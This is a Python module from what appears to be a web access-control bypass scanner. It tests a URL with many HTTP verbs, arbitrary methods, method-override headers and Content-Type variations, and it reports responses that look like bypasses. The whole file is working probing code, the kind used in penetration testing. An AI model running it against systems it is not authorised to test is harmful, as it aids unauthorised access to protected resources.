"""
Technique: HTTP Verb Tampering & Method Override
--------------------------------------------------
Access controls sometimes only check specific HTTP methods.
Switching verbs or using method-override headers can bypass them.

Techniques:
  - Method switching:     GET → POST, HEAD, PUT, OPTIONS, PATCH
  - Override headers:     X-HTTP-Method-Override: GET
  - Arbitrary verbs:      HACK, BYPASS, FUZZ
  - HEAD method:          returns headers only — often bypasses body checks
  - OPTIONS method:       preflight check — reveals allowed methods
  - TRACE method:         echoes request — info disclosure
  - Protocol version:     HTTP/1.0 vs HTTP/2 differences
  - Content-Type tricks:  multipart/form-data with GET
"""

from ..core import http_request, is_bypass, colored_status, R, G, Y, C, DIM, BOLD, RST

HTTP_METHODS = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "HEAD", "OPTIONS", "TRACE", "CONNECT",
    "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
    "LOCK", "UNLOCK", "SEARCH",
    # Arbitrary methods — some servers accept any method
    "BYPASS", "HACK", "FUZZ", "TEST", "SCAN",
    "GET-BYPASS", "POST-BYPASS",
]

METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-HTTP-Method",
    "_method",
    "X-HTTP-VERB",
]

# Content-Types that sometimes bypass ACL checks
CONTENT_TYPES = [
    "application/json",
    "application/xml",
    "multipart/form-data",
    "text/xml",
    "application/x-www-form-urlencoded",
    "text/html",
    None,
]


def run(url: str, baseline: dict,
        cookies: str = None, extra_headers: dict = None,
        verbose: bool = True) -> list:
    """Run all verb tampering techniques."""
    findings = []
    base_headers = extra_headers or {}
    orig_method  = baseline.get("method", "GET")

    if verbose:
        total = len(HTTP_METHODS) + len(METHOD_OVERRIDE_HEADERS) * 4
        print(f"\n  {C}[VERB TAMPERING]{RST} Testing {total} method variants")

    def _test(method, headers, technique):
        resp = http_request(url, method=method,
                             headers={**base_headers, **headers},
                             cookies=cookies)
        bypassed, conf, reason = is_bypass(
            baseline["status"], resp["status"],
            baseline["body_length"], resp["body_length"]
        )
        result = {
            "technique":   "verb_tampering",
            "variant":     technique,
            "method":      method,
            "headers":     headers,
            "url":         url,
            "status":      resp["status"],
            "body_length": resp["body_length"],
            "bypass":      bypassed,
            "confidence":  conf,
            "reason":      reason,
            "body_snippet":resp["body"][:200] if bypassed else "",
            "allowed_methods": resp["headers"].get("allow", ""),
        }
        if bypassed:
            findings.append(result)
            if verbose:
                col = G if conf == "high" else Y
                print(f"\r{' '*70}\r  {col}{BOLD}[BYPASS]{RST} {technique}")
                print(f"    Method : {method}")
                if headers:
                    for k, v in headers.items():
                        print(f"    Header : {k}: {v}")
                print(f"    Status : {colored_status(resp['status'])} | "
                      f"Length: {resp['body_length']}")
                print(f"    Reason : {reason}\n")
        elif verbose:
            # Show OPTIONS allowed header if present
            if resp["headers"].get("allow"):
                print(f"\r{' '*70}\r  {DIM}[OPTIONS]{RST} Allowed: "
                      f"{resp['headers']['allow']}")
            else:
                print(f"  {DIM}[{colored_status(resp['status'])}]{RST} "
                      f"{method:<15}", end="\r")
        return result

    # Raw method switching
    for method in HTTP_METHODS:
        if method != orig_method:
            _test(method, {}, f"method_{method.lower()}")

    # Method override headers (keep original method, override via header)
    for override_header in METHOD_OVERRIDE_HEADERS:
        for override_val in ["GET", "POST", "PUT"]:
            _test(orig_method,
                  {override_header: override_val},
                  f"override_{override_header.lower().replace('-','_')}_{override_val.lower()}")

    # Content-Type tricks on GET
    for ct in CONTENT_TYPES:
        if ct:
            _test("GET", {"Content-Type": ct},
                  f"content_type_{ct.split('/')[1][:10]}")

    if verbose:
        print(f"\r{' '*70}\r", end="")

    return findings
